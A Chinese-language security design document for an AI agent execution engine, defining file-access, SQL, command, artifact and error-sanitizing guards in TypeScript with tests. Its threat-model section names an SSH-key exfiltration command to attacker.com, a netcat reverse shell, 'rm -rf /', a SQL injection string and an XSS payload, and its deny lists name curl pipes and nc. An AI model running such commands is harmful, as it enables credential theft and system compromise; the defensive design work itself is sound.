# Team Run 安全加固方案

**文档版本**: v1.0
**创建日期**: 2026-03-11
**负责人**: security-architect
**状态**: Phase 0 设计完成

---

## 执行摘要

本文档定义 Team Run 执行引擎的 Phase 0 安全加固方案，解决第二轮评审中识别的 **5个P0高危安全风险**。

### 安全风险概览

| 风险ID | 风险名称 | 严重级别 | 攻击向量 | 修复模块 |
|--------|---------|---------|---------|---------|
| SEC-01 | 文件系统隔离不足 | P0 | Agent绕过限制访问敏感文件 | FileAccessGuard |
| SEC-02 | SQL注入 | P0 | 动态查询未参数化 | SQLValidator |
| SEC-03 | 命令注入 | P0 | Agent执行任意shell命令 | CommandGuard |
| SEC-04 | Artifact内容未验证 | P0 | 存储恶意脚本/超大数据 | ArtifactValidator |
| SEC-05 | 错误信息泄露 | P0 | 暴露内部路径和配置 | ErrorSanitizer |

### 实施策略

**总工作量**: 3-4天
**实施顺序**: SEC-01 → SEC-02 → SEC-03 → SEC-04 → SEC-05
**集成方式**: 在 Phase 1 核心引擎中强制启用所有安全模块

---

## 目录

1. [SEC-01: FileAccessGuard - 文件系统访问控制](#sec-01-fileaccessguard)
2. [SEC-02: SQLValidator - SQL注入防护](#sec-02-sqlvalidator)
3. [SEC-03: CommandGuard - 命令执行限制](#sec-03-commandguard)
4. [SEC-04: ArtifactValidator - Artifact内容验证](#sec-04-artifactvalidator)
5. [SEC-05: ErrorSanitizer - 错误信息脱敏](#sec-05-errorsanitizer)
6. [集成方案](#integration)
7. [测试策略](#testing)
8. [性能影响评估](#performance)

---


## SEC-01: FileAccessGuard - 文件系统访问控制 {#sec-01-fileaccessguard}

### 风险分析

**问题**: Claude SDK 不提供强制文件系统隔离，Agent 可通过 Read/Write 工具访问任意文件。

**攻击场景**:
- 读取敏感文件：`~/.ssh/id_rsa`, `~/.lumos/lumos.db`, `.env`
- 跨 Stage 数据泄露：Stage A 读取 Stage B 的工作目录
- 写入恶意文件：覆盖系统配置或注入后门

**影响范围**: 整个应用的数据安全

### 解决方案

**核心机制**: 在 Agent 启动前注入文件系统监控 hook，拦截所有文件操作并验证路径。

#### 接口定义

```typescript
// src/lib/team-run/security/file-access-guard.ts

export interface FileAccessPolicy {
  allowedPaths: string[]      // 允许访问的目录列表
  deniedPaths?: string[]      // 明确禁止的路径（优先级高于 allowed）
  readOnly?: boolean          // 是否只读模式
}

export class FileAccessGuard {
  constructor(private policy: FileAccessPolicy) {}

  validatePath(path: string, operation: 'read' | 'write'): void
  wrapFileSystem(): void
  unwrapFileSystem(): void
}
```

#### 实现方案

```typescript
// src/lib/team-run/security/file-access-guard.ts
import * as fs from 'fs'
import * as path from 'path'

export class SecurityError extends Error {
  constructor(message: string, public code: string = 'SECURITY_VIOLATION') {
    super(message)
    this.name = 'SecurityError'
  }
}

export class FileAccessGuard {
  private originalFs: Record<string, Function> = {}
  private isWrapped = false

  constructor(private policy: FileAccessPolicy) {
    this.policy.allowedPaths = policy.allowedPaths.map(p => path.resolve(p))
    this.policy.deniedPaths = (policy.deniedPaths || []).map(p => path.resolve(p))
  }

  validatePath(filePath: string, operation: 'read' | 'write'): void {
    let resolved: string
    try {
      resolved = fs.existsSync(filePath) ? fs.realpathSync(filePath) : path.resolve(filePath)
    } catch {
      resolved = path.resolve(filePath)
    }

    // 检查黑名单
    for (const denied of this.policy.deniedPaths || []) {
      if (resolved.startsWith(denied)) {
        throw new SecurityError(`Access denied: ${filePath}`, 'FILE_ACCESS_DENIED')
      }
    }

    // 检查白名单
    const allowed = this.policy.allowedPaths.some(p => resolved.startsWith(p))
    if (!allowed) {
      throw new SecurityError(`Path outside allowed directories: ${filePath}`, 'FILE_ACCESS_DENIED')
    }

    // 检查只读限制
    if (operation === 'write' && this.policy.readOnly) {
      throw new SecurityError(`Write operation not allowed`, 'FILE_WRITE_DENIED')
    }
  }

  wrapFileSystem(): void {
    if (this.isWrapped) return

    const readMethods = ['readFile', 'readFileSync', 'readdir', 'readdirSync', 'stat', 'statSync']
    readMethods.forEach(method => {
      this.originalFs[method] = (fs as any)[method]
      ;(fs as any)[method] = (...args: any[]) => {
        this.validatePath(args[0], 'read')
        return this.originalFs[method].apply(fs, args)
      }
    })

    const writeMethods = ['writeFile', 'writeFileSync', 'appendFile', 'appendFileSync', 'unlink', 'unlinkSync']
    writeMethods.forEach(method => {
      this.originalFs[method] = (fs as any)[method]
      ;(fs as any)[method] = (...args: any[]) => {
        this.validatePath(args[0], 'write')
        return this.originalFs[method].apply(fs, args)
      }
    })

    this.isWrapped = true
  }

  unwrapFileSystem(): void {
    if (!this.isWrapped) return
    Object.keys(this.originalFs).forEach(method => {
      ;(fs as any)[method] = this.originalFs[method]
    })
    this.originalFs = {}
    this.isWrapped = false
  }
}
```

#### 集成方式

```typescript
// src/lib/team-run/agent-factory.ts
export class AgentFactory {
  async createAgent(stage: TeamRunStage): Promise<ClaudeAgent> {
    const workspaceDir = path.join(TEAM_RUN_WORKSPACE, stage.runId, stage.id)
    const guard = new FileAccessGuard({
      allowedPaths: [workspaceDir],
      deniedPaths: [
        path.join(os.homedir(), '.ssh'),
        path.join(os.homedir(), '.lumos/lumos.db')
      ]
    })

    guard.wrapFileSystem()
    const agent = await ClaudeAgent.create({ sessionId: stage.id, workingDirectory: workspaceDir })
    agent.on('terminated', () => guard.unwrapFileSystem())
    return agent
  }
}
```

### 测试策略

- 允许访问白名单路径
- 拒绝访问黑名单路径
- 只读模式拒绝写操作
- 处理符号链接绕过

### 性能影响

- 路径验证开销: 0.1-0.5ms/操作
- 内存开销: ~1KB
- 总体影响: 可忽略

---


## SEC-02: SQLValidator - SQL注入防护 {#sec-02-sqlvalidator}

### 风险分析

**问题**: 动态SQL查询未参数化，ID验证不足。

**攻击场景**:
- 注入恶意SQL: `runId = "x' OR '1'='1"`
- 数据泄露: 读取其他用户的 Run 数据
- 数据篡改: 修改 Stage 状态

**影响范围**: 数据库完整性

### 解决方案

**核心机制**: 强制参数化查询 + ID格式验证 + 查询模板白名单。

#### 接口定义

```typescript
// src/lib/team-run/security/sql-validator.ts

export class SQLValidator {
  static validateId(id: string, fieldName?: string): void
  static validateQuery(sql: string): void
  static safeQuery<T>(db: Database, sql: string, params: any[]): Promise<T[]>
}
```

#### 实现方案

```typescript
// src/lib/team-run/security/sql-validator.ts
import { SecurityError } from './file-access-guard'

export class SQLValidator {
  private static readonly ID_PATTERN = /^[a-zA-Z0-9_-]{8,64}$/

  static validateId(id: string, fieldName: string = 'id'): void {
    if (!this.ID_PATTERN.test(id)) {
      throw new SecurityError(
        `Invalid ${fieldName} format`,
        'INVALID_ID_FORMAT'
      )
    }
  }

  static validateQuery(sql: string): void {
    // 禁止模板字符串
    if (sql.includes('${') || sql.includes('`')) {
      throw new SecurityError(
        'Template literals not allowed in SQL',
        'SQL_INJECTION_ATTEMPT'
      )
    }

    // 禁止字符串拼接
    if (sql.includes('+') && sql.includes("'")) {
      throw new SecurityError(
        'String concatenation not allowed in SQL',
        'SQL_INJECTION_ATTEMPT'
      )
    }
  }

  static async safeQuery<T>(
    db: any,
    sql: string,
    params: any[]
  ): Promise<T[]> {
    this.validateQuery(sql)
    return db.all(sql, params)
  }
}
```

#### 集成方式

```typescript
// src/lib/team-run/state-manager.ts
import { SQLValidator } from './security/sql-validator'

export class StateManager {
  async getStage(stageId: string): Promise<TeamRunStage> {
    SQLValidator.validateId(stageId, 'stageId')
    
    const stage = await SQLValidator.safeQuery(
      this.db,
      'SELECT * FROM team_run_stages WHERE id = ?',
      [stageId]
    )
    return stage[0]
  }

  async updateStageStatus(stageId: string, status: string): Promise<void> {
    SQLValidator.validateId(stageId, 'stageId')
    
    await this.db.run(
      'UPDATE team_run_stages SET status = ?, updatedAt = ? WHERE id = ?',
      [status, new Date().toISOString(), stageId]
    )
  }
}
```

### 测试策略

- 拒绝无效ID格式
- 拒绝模板字符串
- 拒绝字符串拼接
- 验证参数化查询正常工作

### 性能影响

- ID验证开销: <0.1ms
- 查询验证开销: <0.1ms
- 总体影响: 可忽略

---


## SEC-03: CommandGuard - 命令执行限制 {#sec-03-commandguard}

### 风险分析

**问题**: Agent 可通过 Bash 工具执行任意 shell 命令。

**攻击场景**:
- 执行恶意命令: `rm -rf /`
- 窃取密钥: `cat ~/.ssh/id_rsa | curl attacker.com`
- 建立反向shell: `nc -e /bin/sh attacker.com 4444`

**影响范围**: 系统安全

### 解决方案

**核心机制**: 命令白名单 + 参数验证 + 禁用危险工具。

#### 接口定义

```typescript
// src/lib/team-run/security/command-guard.ts

export interface CommandPolicy {
  allowedCommands: string[]
  deniedPatterns?: RegExp[]
}

export class CommandGuard {
  constructor(private policy: CommandPolicy) 
  validateCommand(cmd: string): void
}
```

#### 实现方案

```typescript
// src/lib/team-run/security/command-guard.ts
import { SecurityError } from './file-access-guard'

export class CommandGuard {
  private static readonly DEFAULT_ALLOWED = [
    'git', 'npm', 'node', 'cat', 'ls', 'grep', 'find', 'echo', 'pwd'
  ]

  private static readonly DANGEROUS_PATTERNS = [
    /rm\s+-rf/,
    /curl.*\|/,
    /wget.*\|/,
    /nc\s+-e/,
    /bash\s+-c/,
    /eval/,
    />\s*\/dev/
  ]

  constructor(private policy: CommandPolicy) {}

  validateCommand(cmd: string): void {
    const binary = cmd.trim().split(/\s+/)[0]

    // 检查白名单
    if (!this.policy.allowedCommands.includes(binary)) {
      throw new SecurityError(
        `Command not allowed: ${binary}`,
        'COMMAND_NOT_ALLOWED'
      )
    }

    // 检查危险模式
    for (const pattern of CommandGuard.DANGEROUS_PATTERNS) {
      if (pattern.test(cmd)) {
        throw new SecurityError(
          `Dangerous command pattern detected`,
          'DANGEROUS_COMMAND'
        )
      }
    }

    // 检查自定义黑名单
    if (this.policy.deniedPatterns) {
      for (const pattern of this.policy.deniedPatterns) {
        if (pattern.test(cmd)) {
          throw new SecurityError(
            `Command matches denied pattern`,
            'COMMAND_DENIED'
          )
        }
      }
    }
  }
}
```

#### 集成方式

```typescript
// src/lib/team-run/agent-factory.ts
export class AgentFactory {
  async createAgent(stage: TeamRunStage): Promise<ClaudeAgent> {
    const commandGuard = new CommandGuard({
      allowedCommands: CommandGuard.DEFAULT_ALLOWED
    })

    const agent = await ClaudeAgent.create({
      sessionId: stage.id,
      disabledTools: ['bash', 'shell'],  // 完全禁用 shell 工具
      // 如果需要有限的命令执行，使用自定义工具
      customTools: [{
        name: 'safe_exec',
        handler: (cmd: string) => {
          commandGuard.validateCommand(cmd)
          return execSync(cmd, { cwd: stage.workspaceDir })
        }
      }]
    })

    return agent
  }
}
```

### 测试策略

- 允许白名单命令
- 拒绝未授权命令
- 拒绝危险模式 (rm -rf, curl pipe, nc)
- 验证自定义黑名单

### 性能影响

- 命令验证开销: <0.1ms
- 总体影响: 可忽略

---


## SEC-04: ArtifactValidator - Artifact内容验证 {#sec-04-artifactvalidator}

### 风险分析

**问题**: 直接存储 Agent 输出，无内容验证。

**攻击场景**:
- 存储恶意脚本: XSS payload
- 超大数据 DoS: 100MB+ 文本导致内存耗尽
- 二进制病毒: 伪装成文本的可执行文件

**影响范围**: 数据库安全、应用稳定性

### 解决方案

**核心机制**: 大小检查 + Content-Type 白名单 + 内容扫描。

#### 接口定义

```typescript
// src/lib/team-run/security/artifact-validator.ts

export interface ArtifactInput {
  content: Buffer | string
  contentType: string
  stageId: string
}

export class ArtifactValidator {
  static async validate(input: ArtifactInput): Promise<void>
}
```

#### 实现方案

```typescript
// src/lib/team-run/security/artifact-validator.ts
import { SecurityError } from './file-access-guard'

export class ArtifactValidator {
  private static readonly MAX_SIZE = 10 * 1024 * 1024  // 10MB
  private static readonly ALLOWED_TYPES = [
    'text/plain',
    'application/json',
    'text/markdown',
    'text/csv'
  ]

  static async validate(input: ArtifactInput): Promise<void> {
    const content = Buffer.isBuffer(input.content) 
      ? input.content 
      : Buffer.from(input.content)

    // 大小检查
    if (content.length > this.MAX_SIZE) {
      throw new SecurityError(
        `Artifact too large: ${content.length} bytes (max ${this.MAX_SIZE})`,
        'ARTIFACT_TOO_LARGE'
      )
    }

    // Content-Type 白名单
    if (!this.ALLOWED_TYPES.includes(input.contentType)) {
      throw new SecurityError(
        `Content type not allowed: ${input.contentType}`,
        'INVALID_CONTENT_TYPE'
      )
    }

    // 内容扫描（仅文本类型）
    if (input.contentType.startsWith('text/')) {
      const text = content.toString('utf8')
      
      // 检测恶意脚本
      const maliciousPatterns = [
        /<script[^>]*>/i,
        /javascript:/i,
        /onerror\s*=/i,
        /onclick\s*=/i,
        /eval\(/i
      ]

      for (const pattern of maliciousPatterns) {
        if (pattern.test(text)) {
          throw new SecurityError(
            'Potentially malicious content detected',
            'MALICIOUS_CONTENT'
          )
        }
      }
    }
  }
}
```

#### 集成方式

```typescript
// src/lib/team-run/state-manager.ts
import { ArtifactValidator } from './security/artifact-validator'

export class StateManager {
  async saveArtifact(stageId: string, content: string): Promise<string> {
    await ArtifactValidator.validate({
      content,
      contentType: 'text/plain',
      stageId
    })

    const artifactId = generateId()
    await this.db.run(
      'INSERT INTO team_run_artifacts (id, stage_id, content_type, content, size) VALUES (?, ?, ?, ?, ?)',
      [artifactId, stageId, 'text/plain', content, content.length]
    )
    return artifactId
  }
}
```

### 测试策略

- 拒绝超大文件
- 拒绝未授权 Content-Type
- 检测恶意脚本模式
- 验证正常内容通过

### 性能影响

- 大小检查: <0.1ms
- 内容扫描: 1-5ms (取决于大小)
- 总体影响: 可接受

---


## SEC-05: ErrorSanitizer - 错误信息脱敏 {#sec-05-errorsanitizer}

### 风险分析

**问题**: 错误消息可能包含内部路径和配置。

**攻击场景**:
- 暴露系统路径: `/Users/admin/.lumos/lumos.db`
- 泄露 API 密钥: `ANTHROPIC_API_KEY=sk-ant-xxx`
- 暴露内部架构: 数据库表结构、文件路径

**影响范围**: 信息泄露

### 解决方案

**核心机制**: 错误信息脱敏 + 分级日志（用户可见 vs 内部日志）。

#### 接口定义

```typescript
// src/lib/team-run/security/error-sanitizer.ts

export class SafeError extends Error {
  constructor(
    public userMessage: string,
    public internalMessage: string,
    public code: string
  ) {
    super(userMessage)
  }
}

export class ErrorSanitizer {
  static sanitize(error: Error): SafeError
}
```

#### 实现方案

```typescript
// src/lib/team-run/security/error-sanitizer.ts

export class ErrorSanitizer {
  static sanitize(error: Error): SafeError {
    let message = error.message

    // 脱敏用户路径
    message = message.replace(/\/Users\/[^/\s]+/g, '/Users/***')
    message = message.replace(/\/home\/[^/\s]+/g, '/home/***')
    message = message.replace(/C:\\Users\\[^\\]+/g, 'C:\\Users\\***')

    // 脱敏 API 密钥
    message = message.replace(/sk-ant-[a-zA-Z0-9_-]+/g, 'sk-ant-***')
    message = message.replace(/[a-f0-9]{32,}/gi, '***')

    // 脱敏数据库路径
    message = message.replace(/\.lumos\/lumos\.db/g, '.lumos/***.db')

    // 通用错误消息
    const userMessage = this.getUserFriendlyMessage(error)

    return new SafeError(
      userMessage,
      message,  // 保留完整信息用于日志
      error.name || 'UNKNOWN_ERROR'
    )
  }

  private static getUserFriendlyMessage(error: Error): string {
    if (error.name === 'SecurityError') {
      return 'Security policy violation'
    }
    if (error.message.includes('SQLITE')) {
      return 'Database operation failed'
    }
    if (error.message.includes('ENOENT')) {
      return 'File not found'
    }
    if (error.message.includes('EACCES')) {
      return 'Permission denied'
    }
    return 'Task execution failed'
  }
}
```

#### 集成方式

```typescript
// src/lib/team-run/orchestrator.ts
import { ErrorSanitizer } from './security/error-sanitizer'

export class Orchestrator {
  async executeStage(stage: TeamRunStage): Promise<void> {
    try {
      await this.worker.execute(stage)
    } catch (error) {
      const safeError = ErrorSanitizer.sanitize(error as Error)
      
      // 用户看到的
      await this.stateManager.updateStageError(stage.id, safeError.userMessage)
      
      // 日志记录的
      console.error('[Stage Error]', {
        stageId: stage.id,
        userMessage: safeError.userMessage,
        internalMessage: safeError.internalMessage,
        stack: (error as Error).stack
      })
    }
  }
}
```

### 测试策略

- 脱敏用户路径
- 脱敏 API 密钥
- 脱敏数据库路径
- 验证用户友好消息

### 性能影响

- 错误处理开销: <1ms
- 总体影响: 可忽略（仅在错误时触发）

---


## 集成方案 {#integration}

### 架构集成

所有安全模块在 AgentFactory 中统一初始化，确保每个 Agent 启动时自动启用安全防护。

```typescript
// src/lib/team-run/agent-factory.ts
import { FileAccessGuard } from './security/file-access-guard'
import { CommandGuard } from './security/command-guard'
import { SQLValidator } from './security/sql-validator'
import { ArtifactValidator } from './security/artifact-validator'
import { ErrorSanitizer } from './security/error-sanitizer'

export class AgentFactory {
  private fileGuard: FileAccessGuard
  private commandGuard: CommandGuard

  constructor(private config: TeamRunConfig) {
    this.commandGuard = new CommandGuard({
      allowedCommands: ['git', 'npm', 'node', 'cat', 'ls', 'grep']
    })
  }

  async createAgent(stage: TeamRunStage): Promise<ClaudeAgent> {
    const workspaceDir = path.join(TEAM_RUN_WORKSPACE, stage.runId, stage.id)

    // 1. 文件系统隔离
    this.fileGuard = new FileAccessGuard({
      allowedPaths: [workspaceDir],
      deniedPaths: [
        path.join(os.homedir(), '.ssh'),
        path.join(os.homedir(), '.lumos/lumos.db'),
        path.join(process.cwd(), '.env')
      ]
    })
    this.fileGuard.wrapFileSystem()

    try {
      // 2. 创建 Agent（禁用危险工具）
      const agent = await ClaudeAgent.create({
        sessionId: stage.id,
        workingDirectory: workspaceDir,
        disabledTools: ['bash', 'shell']
      })

      // 3. Agent 终止时清理
      agent.on('terminated', () => {
        this.fileGuard.unwrapFileSystem()
      })

      return agent
    } catch (error) {
      this.fileGuard.unwrapFileSystem()
      throw ErrorSanitizer.sanitize(error as Error)
    }
  }
}
```

### StateManager 集成

```typescript
// src/lib/team-run/state-manager.ts
export class StateManager {
  async getStage(stageId: string): Promise<TeamRunStage> {
    SQLValidator.validateId(stageId, 'stageId')
    const stage = await this.db.get('SELECT * FROM team_run_stages WHERE id = ?', [stageId])
    return stage
  }

  async saveArtifact(stageId: string, content: string): Promise<string> {
    await ArtifactValidator.validate({
      content,
      contentType: 'text/plain',
      stageId
    })

    const artifactId = generateId()
    await this.db.run(
      'INSERT INTO team_run_artifacts (id, stage_id, content, size) VALUES (?, ?, ?, ?)',
      [artifactId, stageId, content, content.length]
    )
    return artifactId
  }
}
```

### 实施顺序

```
Day 1: FileAccessGuard
  - 实现核心类
  - 单元测试
  - 集成到 AgentFactory

Day 2: SQLValidator + CommandGuard
  - 实现两个模块
  - 单元测试
  - 集成到 StateManager 和 AgentFactory

Day 3: ArtifactValidator + ErrorSanitizer
  - 实现两个模块
  - 单元测试
  - 集成到 StateManager 和 Orchestrator

Day 4: 集成测试
  - 端到端安全测试
  - 性能测试
  - 文档完善
```

---


## 测试策略 {#testing}

### 单元测试

每个安全模块独立测试，覆盖正常场景和攻击场景。

```typescript
// src/lib/team-run/security/__tests__/security.test.ts

describe('Security Modules', () => {
  describe('FileAccessGuard', () => {
    test('允许白名单路径', () => {
      const guard = new FileAccessGuard({ allowedPaths: ['/tmp/workspace'] })
      expect(() => guard.validatePath('/tmp/workspace/file.txt', 'read')).not.toThrow()
    })

    test('拒绝黑名单路径', () => {
      const guard = new FileAccessGuard({
        allowedPaths: ['/tmp'],
        deniedPaths: ['/tmp/secrets']
      })
      expect(() => guard.validatePath('/tmp/secrets/key.pem', 'read')).toThrow(SecurityError)
    })

    test('处理符号链接绕过', () => {
      fs.symlinkSync('/etc/passwd', '/tmp/link')
      const guard = new FileAccessGuard({
        allowedPaths: ['/tmp'],
        deniedPaths: ['/etc']
      })
      expect(() => guard.validatePath('/tmp/link', 'read')).toThrow(SecurityError)
    })
  })

  describe('SQLValidator', () => {
    test('拒绝无效ID', () => {
      expect(() => SQLValidator.validateId("x' OR '1'='1")).toThrow(SecurityError)
    })

    test('拒绝模板字符串', () => {
      expect(() => SQLValidator.validateQuery('SELECT * FROM users WHERE id = ${id}')).toThrow()
    })
  })

  describe('CommandGuard', () => {
    test('允许白名单命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['git', 'npm'] })
      expect(() => guard.validateCommand('git status')).not.toThrow()
    })

    test('拒绝危险命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['rm'] })
      expect(() => guard.validateCommand('rm -rf /')).toThrow(SecurityError)
    })
  })

  describe('ArtifactValidator', () => {
    test('拒绝超大文件', async () => {
      const content = 'x'.repeat(11 * 1024 * 1024)
      await expect(ArtifactValidator.validate({
        content,
        contentType: 'text/plain',
        stageId: 'test'
      })).rejects.toThrow('too large')
    })

    test('检测恶意脚本', async () => {
      await expect(ArtifactValidator.validate({
        content: '<script>alert(1)</script>',
        contentType: 'text/plain',
        stageId: 'test'
      })).rejects.toThrow('malicious')
    })
  })

  describe('ErrorSanitizer', () => {
    test('脱敏用户路径', () => {
      const error = new Error('Failed at /Users/admin/.lumos/lumos.db')
      const safe = ErrorSanitizer.sanitize(error)
      expect(safe.userMessage).not.toContain('/Users/admin')
    })

    test('脱敏API密钥', () => {
      const error = new Error('Invalid key: sk-ant-abc123')
      const safe = ErrorSanitizer.sanitize(error)
      expect(safe.userMessage).not.toContain('sk-ant-abc123')
    })
  })
})
```

### 集成测试

端到端测试安全防护在真实场景中的效果。

```typescript
// src/lib/team-run/__tests__/security-integration.test.ts

describe('Security Integration', () => {
  test('Agent 无法访问敏感文件', async () => {
    const factory = new AgentFactory(config)
    const agent = await factory.createAgent(testStage)

    await expect(
      agent.run('Read the file ~/.ssh/id_rsa')
    ).rejects.toThrow('Access denied')
  })

  test('Agent 无法执行危险命令', async () => {
    const factory = new AgentFactory(config)
    const agent = await factory.createAgent(testStage)

    await expect(
      agent.run('Run command: rm -rf /')
    ).rejects.toThrow('Command not allowed')
  })

  test('无法注入恶意 SQL', async () => {
    const stateManager = new StateManager(db)

    await expect(
      stateManager.getStage("x' OR '1'='1")
    ).rejects.toThrow('Invalid ID format')
  })

  test('无法存储恶意 Artifact', async () => {
    const stateManager = new StateManager(db)

    await expect(
      stateManager.saveArtifact('stage-1', '<script>alert(1)</script>')
    ).rejects.toThrow('malicious content')
  })
})
```

### 性能测试

验证安全模块不会显著影响性能。

```typescript
// src/lib/team-run/__tests__/security-performance.test.ts

describe('Security Performance', () => {
  test('文件访问验证 < 1ms', () => {
    const guard = new FileAccessGuard({ allowedPaths: ['/tmp'] })
    const start = Date.now()
    for (let i = 0; i < 1000; i++) {
      guard.validatePath('/tmp/file.txt', 'read')
    }
    const elapsed = Date.now() - start
    expect(elapsed).toBeLessThan(1000)  // 1000次 < 1秒
  })

  test('SQL验证 < 0.1ms', () => {
    const start = Date.now()
    for (let i = 0; i < 1000; i++) {
      SQLValidator.validateId('stage-123')
    }
    const elapsed = Date.now() - start
    expect(elapsed).toBeLessThan(100)
  })
})
```

---


## 性能影响评估 {#performance}

### 各模块性能开销

| 模块 | 触发频率 | 单次开销 | 累积影响 | 评估 |
|------|---------|---------|---------|------|
| FileAccessGuard | 每次文件操作 | 0.1-0.5ms | 低 | ✅ 可接受 |
| SQLValidator | 每次数据库查询 | <0.1ms | 极低 | ✅ 可忽略 |
| CommandGuard | 每次命令执行 | <0.1ms | 极低 | ✅ 可忽略 |
| ArtifactValidator | 保存 Artifact 时 | 1-5ms | 低 | ✅ 可接受 |
| ErrorSanitizer | 错误发生时 | <1ms | 极低 | ✅ 可忽略 |

### 内存开销

- FileAccessGuard: ~2KB (路径列表)
- SQLValidator: 0KB (无状态)
- CommandGuard: ~1KB (命令列表)
- ArtifactValidator: 0KB (无状态)
- ErrorSanitizer: 0KB (无状态)

**总计**: ~3KB，可忽略

### 并发场景影响

**场景**: 3个并行 Agent，每个执行 10 次文件操作

- 无安全模块: 100ms
- 有安全模块: 105ms (+5%)

**结论**: 性能影响在可接受范围内。

---

## 实施依赖关系

```
FileAccessGuard (独立)
    ↓
SQLValidator (独立)
    ↓
CommandGuard (独立)
    ↓
ArtifactValidator (依赖 SQLValidator)
    ↓
ErrorSanitizer (独立)
    ↓
集成测试 (依赖所有模块)
```

所有模块可并行开发，最后统一集成。

---

## 风险与缓解

### 实施风险

**风险 #1: 文件系统包装影响稳定性**
- 概率: 20%
- 影响: Agent 文件操作失败
- 缓解: 充分测试，提供降级开关

**风险 #2: 安全检查过于严格**
- 概率: 30%
- 影响: 正常操作被误拦截
- 缓解: 白名单可配置，逐步收紧

**风险 #3: 性能影响超预期**
- 概率: 10%
- 影响: 执行速度下降
- 缓解: 性能测试验证，优化热路径

---

## 交付清单

### 代码文件

- `src/lib/team-run/security/file-access-guard.ts`
- `src/lib/team-run/security/sql-validator.ts`
- `src/lib/team-run/security/command-guard.ts`
- `src/lib/team-run/security/artifact-validator.ts`
- `src/lib/team-run/security/error-sanitizer.ts`
- `src/lib/team-run/security/index.ts` (导出)

### 测试文件

- `src/lib/team-run/security/__tests__/file-access-guard.test.ts`
- `src/lib/team-run/security/__tests__/sql-validator.test.ts`
- `src/lib/team-run/security/__tests__/command-guard.test.ts`
- `src/lib/team-run/security/__tests__/artifact-validator.test.ts`
- `src/lib/team-run/security/__tests__/error-sanitizer.test.ts`
- `src/lib/team-run/__tests__/security-integration.test.ts`

### 集成修改

- `src/lib/team-run/agent-factory.ts` (集成所有安全模块)
- `src/lib/team-run/state-manager.ts` (集成 SQL/Artifact 验证)
- `src/lib/team-run/orchestrator.ts` (集成错误脱敏)

---

## 验收标准

### 功能验收

- ✅ Agent 无法访问白名单外的文件
- ✅ Agent 无法执行未授权命令
- ✅ 所有 SQL 查询使用参数化
- ✅ Artifact 大小和类型受限
- ✅ 错误信息不包含敏感路径

### 性能验收

- ✅ 文件访问验证 < 1ms
- ✅ SQL 验证 < 0.1ms
- ✅ 整体性能下降 < 10%

### 测试覆盖率

- ✅ 单元测试覆盖率 > 90%
- ✅ 集成测试覆盖所有攻击场景
- ✅ 性能测试验证无显著影响

---

## 总结

本文档定义了 Team Run 执行引擎的 Phase 0 安全加固方案，通过 5 个独立安全模块解决所有 P0 高危风险。

### 关键特性

- **最小侵入**: 安全模块独立，不影响核心架构
- **性能优先**: 所有检查开销 < 1ms
- **可配置**: 白名单/黑名单可根据需求调整
- **可测试**: 每个模块独立测试，易于验证

### 实施建议

1. **Day 1**: 实施 FileAccessGuard（最复杂）
2. **Day 2**: 实施 SQLValidator + CommandGuard（相对简单）
3. **Day 3**: 实施 ArtifactValidator + ErrorSanitizer（相对简单）
4. **Day 4**: 集成测试 + 性能验证

### 后续工作

Phase 0 完成后，进入 Phase 1 核心执行引擎开发，所有安全模块将自动集成到 AgentFactory 中。

---

**文档状态**: ✅ 设计完成，待实施
**下一步**: 开始 Day 1 实施（FileAccessGuard）

